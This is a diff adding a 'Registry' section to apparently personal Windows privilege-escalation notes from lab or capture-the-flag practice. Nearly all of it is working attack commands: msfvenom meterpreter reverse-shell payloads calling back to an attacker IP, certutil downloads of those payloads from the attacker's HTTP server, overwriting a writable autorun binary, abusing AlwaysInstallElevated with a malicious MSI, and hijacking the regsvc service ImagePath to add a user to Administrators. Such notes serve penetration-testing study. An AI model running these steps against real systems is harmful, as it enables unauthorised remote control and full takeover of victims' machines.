@@ -6,6 +6,7 @@
 4. [Impersonation and Potato Attacks](#impersonation-and-potato-attacks)
 5. [getsystem](#getsystem)
 6. [runas](#runas)
+7. [Registry](#registry)
 
 ## Kernel Exploits
 
@@ -257,4 +258,101 @@ cmdkey /list
 
 #we can use runas to get root flag
 C:\Windows\System32\runas.exe /user:ACCESS\Administrator /savecred "C:\Windows\System32\cmd.exe /c TYPE C:\Users\Administrator\Desktop\root.txt > C:\Users\security\Desktop\root.txt"
+```
+
+## Registry
+
+```shell
+#check autoruns in victim machine
+#in cmd prompt
+C:\Users\User\Desktop\Tools\Autoruns\Autoruns64.exe
+
+#for 'My Program' entry in Autoruns
+#check access using accesschk tool
+C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\Autorun Program"
+#'Everyone' user group has all access permission on 'program.exe'
+
+#in attacker machine
+msfvenom -p windows/meterpreter/reverse_tcp lhost=10.14.31.212 -f exe -o program.exe
+
+msfconsole -q
+
+use multi/handler
+
+set payload windows/meterpreter/reverse_tcp
+
+set LHOST 10.14.31.212
+
+run
+#starts listener
+
+#in another tab
+python3 -m http.server
+
+#in attacker machine
+certutil.exe -urlcache -f http://10.14.31.212:8000/program.exe program.exe
+
+copy program.exe "C:\Program Files\Autorun Program"
+#overwrites autorun program.exe with malicious program
+
+#now we can logout and login back as administrator user
+#this gives us a meterpreter shell at our msfconsole listener
+```
+
+```shell
+#AlwaysInstallElevated
+#in victim cmd prompt
+reg query HKLM\Software\Policies\Microsoft\Windows\Installer
+
+reg query HKCU\Software\Policies\Microsoft\Windows\Installer
+#for both queries, AlwaysInstallElevated is 1
+
+#in attacker machine
+msfvenom -p windows/meterpreter/reverse_tcp lhost=10.14.31.212 -f msi -o setup.msi
+
+msfconsole -q
+
+set payload windows/meterpreter/reverse_tcp
+
+set LHOST 10.14.31.212
+
+run
+
+#in victim machine
+cd C:\Temp
+
+certutil.exe -urlcache -f http://10.14.31.212:8000/setup.msi setup.msi
+
+msiexec /quiet /qn /i C:\Temp\setup.msi
+
+net local administrators
+#our user is added to Administrators group
+```
+
+```shell
+#regsvc
+#in victim powershell
+Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl
+#output shows that user belongs to 'Interactive' and has 'full control' over registry key
+
+#copy the required source file, windows_service.c to attacker machine
+
+#in attacker machine
+vim windows_service.c
+#replace system() function code to include -
+#cmd.exe /k net localgroup administrators user /add
+
+#compile the C code
+x86_64-w64-mingw32-gcc windows_service.c -o x.exe
+
+#copy x.exe to victim machine in C:\Temp
+#in victim command prompt
+reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\Temp\x.exe /f
+#add registry entry with image path value as x.exe
+
+sc start regsvc
+#start modified service
+
+net localgroup administrators
+#our user is added to administrators group
 ```
